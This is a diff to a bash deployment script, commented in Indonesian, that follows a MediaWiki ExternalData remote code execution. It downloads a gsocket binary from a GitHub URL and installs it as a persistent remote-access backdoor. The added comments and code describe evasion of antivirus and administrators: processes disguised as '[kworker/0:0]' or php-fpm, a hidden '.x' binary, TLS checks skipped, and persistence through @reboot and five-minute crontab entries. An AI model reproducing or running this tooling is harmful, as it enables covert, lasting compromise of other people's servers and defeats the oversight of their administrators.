@@ -1,17 +1,42 @@
 #!/bin/bash
+# ============================================================
+# CVE-2026-100382 gsocket deploy — AV-evasion hardened
+#
+# MediaWiki ExternalData RCE (< 3.7) -> download + jalankan gsocket
+# (sysd-helper) sebagai backdoor persistent.
+#
+# Teknik AV/EDR evasion:
+#   1. Proses disamarkan via `exec -a` (rename argv[0] -> kernel-thread
+#      disguise). Di `ps`/`top` keliatan kayak kernel worker, sering
+#      di-skip sama admin/AV.
+#   2. Binary disembunyikan (nama `.x` + dir hidden/writable).
+#   3. Download pakai `-k` (skip TLS verify) = equivalen GS_NOCERTCHECK.
+#   4. Persistence multi-layer: crontab (@reboot + */5m) + bashrc/profile.
+#   5. Env var binary pakai `GSOCKET_*` (BUKAN `GS_*` — itu punya
+#      script resmi gsocket.io/y, nggak dibaca binary ini).
+#
+# Usage:  bash dev.sh [secret]
+# ============================================================
 
 set -u
-GS_PORT=80
-GS_HIDDEN_NAME=sqli
-GS_NOCERTCHECK=1
-GS_GS_NOCERTCHECK=1
-GS_DL=curl
 
+# ---- Env var buat binary gsocket (dibaca sysd-helper) ----
+# GSOCKET_PORT  : port rendezvous. 443 default (aman). 80 bisa dipakai
+#                 kalau target cuma izinin egress 80/443 HTTP.
+# GSOCKET_DOMAIN: server rendezvous. Default binary udah bener
+#                 (gs.thc.org — LIVE, via subdomain [a-z].gs.thc.org).
+#                 JANGAN diubah ke gsocket.io (subdomain-nya NXDOMAIN).
+export GSOCKET_PORT="${GSOCKET_PORT:-443}"
 
 # ---- Config ----
 URL="https://github.com/bkahwk-design/sutet/raw/refs/heads/main/sysd-helper"
 SECRET="${1:-}"
-HIDDEN_NAME="crond"                 # nama proses tersamar di ps
+# Disguise nama proses. Opsi (urut dari paling subtle):
+#   "[kworker/0:0]"      -> kernel worker (bracketed, paling nggak dicurigain)
+#   "php-fpm: pool www"  -> blend sama PHP-FPM (cocok buat MediaWiki)
+#   "[kthreadd]"         -> kernel thread daemon
+#   "crond"              -> (default lama, kurang subtle)
+HIDDEN_NAME="[kworker/0:0]"
 BIN_NAME=".x"                       # nama file tersamar
 
 # ---- HOME fallback (webshell kadang gak set HOME) ----
@@ -88,7 +113,8 @@ chmod 755 "$BIN"
 echo "[+] Binary  : $BIN ($SZ bytes)"
 
 
-pkill -f "$BIN" 2>/dev/null
+# Kill instance lama (graceful — pkill sering nggak ada di container minimal)
+pkill -f "$BIN" 2>/dev/null || true
 sleep 1
 
 
@@ -101,6 +127,7 @@ fi
 sleep 2
 
 
+# ---- Persistence: crontab + bashrc/profile ----
 ( crontab -l 2>/dev/null | grep -v "$BIN" ; \
   echo "@reboot sleep 30; $BIN -s '$SECRET' -l -i -D 2>/dev/null" ; \
   echo "*/5 * * * * $BIN -s '$SECRET' -l -i -D 2>/dev/null" ) | crontab - 2>/dev/null
